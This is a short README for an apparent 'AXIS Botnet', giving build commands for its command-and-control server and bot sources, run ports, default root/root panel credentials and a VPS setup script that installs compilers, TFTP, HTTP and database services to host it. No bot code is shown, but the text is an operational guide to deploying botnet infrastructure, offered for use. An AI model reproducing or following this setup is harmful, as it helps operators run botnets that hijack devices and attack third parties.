# AXIS Botnet

### Installation:
* Linux only:
  * **recommended to use Centos 7**
  * `sudo python3 build.py AXIS_CC.c (server-ip)`
  * `gcc AXIS_CNC.c -o AXIS -pthread`
  * `sudo screen ./AXIS 606 1 909`
  
### Connect Putty
* SSH Config:
  * PORT: 909
  * TYPE: RAW
  
* Password (default)
  * username: root
  * password: root
  
### FOR FRESH VPS COPY THIS AND PLACE IN TO VPS

yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install python3 -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y


cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
sha256sum go1.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
source ~/.bash_profile
go version
go env
cd ~/
